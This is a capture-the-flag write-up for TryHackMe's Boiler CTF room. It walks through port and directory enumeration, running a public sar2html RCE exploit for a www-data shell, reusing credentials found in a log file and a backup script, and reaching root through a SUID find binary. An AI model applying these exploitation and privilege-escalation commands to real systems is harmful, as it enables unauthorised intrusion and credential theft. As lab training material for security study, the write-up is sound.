---
title: "Boiler CTF"
date: 2025-02-02
draft: false
summary: "Writeup for 'Boiler CTF' CTF challenge on TryHackMe."
tags: ["linux", "rce", "suid"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/boilerctf/cover.webp"
  caption: "Boiler CTF TryHackMe Challenge"
  alt: "Boiler CTF cover"
platform: "TryHackMe"
---

Intermediate level CTF. Just enumerate, you'll get there
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/boilerctf2

## Reconnaissance

I performed an **nmap** aggressive scan to identify the open ports, services and run default script scan.

```shell
nmap -A -p- TARGET -oN boiler.nmap --min-rate 10000
```

| **PORT** | **SERVICE** |
| -------- | ----------- |
| 21       | ftp         |
| 80       | http        |
| 10000    | http        |
| 55007    | ssh         |

![](https://cdn.ziomsec.com/boilerctf/1.webp)

![](https://cdn.ziomsec.com/boilerctf/2.webp)

## Initial Foothold

I accessed the **ftp** server and found a txt file called `.info.txt`. I downloaded it and found a rot13 encoded string that said: 

```
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

I accessed the web application on port 80 and found Apache's default landing page. Port 10000 had a login panel.

![](https://cdn.ziomsec.com/boilerctf/3.webp)

I then viewed *robots.txt* on port 80 and found multiple endpoints.

![](https://cdn.ziomsec.com/boilerctf/4.webp)

I also ran a directory bruteforce scan using **ffuf** to find more directories.

```shell
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

![](https://cdn.ziomsec.com/boilerctf/5.webp)

The **JOOMLA** endpoint seemed interesting so I accessed it.

![](https://cdn.ziomsec.com/boilerctf/6.webp)

I brute forced files present in the **joomla** directory.

```shell
ffuf -u http://TARGET/joomla/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,302,301
```

![](https://cdn.ziomsec.com/boilerctf/7.webp)

![](https://cdn.ziomsec.com/boilerctf/8.webp)

I found the version of a web based tool in the source code of `_test`.

![](https://cdn.ziomsec.com/boilerctf/9.webp)

![](https://cdn.ziomsec.com/boilerctf/10.webp)

### Shell as `www-data`

I searched for exploits and found an **RCE**.

```shell
searchsploit 'sar2html'
```

![](https://cdn.ziomsec.com/boilerctf/11.webp)

I used the following exploit to execute os commands on the target and found the username and password of a user in the log file.
- https://github.com/Jsmoreira02/sar2HTML_exploit

```shell
python3 sar2html_exploit.py http://TARGET/joomla/_test/index.php --command "cat log.txt"
```

![](https://cdn.ziomsec.com/boilerctf/12.webp)

This exploit also allowed us to spawn an interactive shell as **www-data**.

```shell
python3 sar2html_exploit.py http://TARGET/joomla/_test/index.php --shell_mode
```

![](https://cdn.ziomsec.com/boilerctf/13.webp)

### Shell as `basterd`

I used the credentials found from the log file to get shell access on the target and spawned a pty shell using **python**.

```shell
ssh basterd@TARGET -p 55007
export TERM=xterm
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![](https://cdn.ziomsec.com/boilerctf/14.webp)

I analyzed the **backup.sh** script and found the credentials of another user.

```shell
ls -la
cat backup.sh
```

![](https://cdn.ziomsec.com/boilerctf/15.webp)

![](https://cdn.ziomsec.com/boilerctf/16.webp)

### Shell as `stoner`

I quickly switched user and was able to capture the first flag from *stoner*'s home directory.

```shell
su stoner
cat .secret
```

![](https://cdn.ziomsec.com/boilerctf/17.webp)

## Privilege Escalation

I then looked for binaries with **suid** bit set and found the **find** command.

```shell
find / -user root -perm -u=s -ls 2>/dev/null
```

![](https://cdn.ziomsec.com/boilerctf/18.webp)

Since this was uncommon, I visited **gtfobins** and found a way to exploit this in order to get root access.
- https://gtfobins.github.io/gtfobins/find/#suid

```shell
find . -exec /bin/bash -p\; -quit
```

![](https://cdn.ziomsec.com/boilerctf/19.webp)

After getting root access, I captured the root flag from the */root* directory.

```shell
cd /root
cat root.txt
```

![](https://cdn.ziomsec.com/boilerctf/20.webp)

That's it from my side :)
Happy hacking!

---
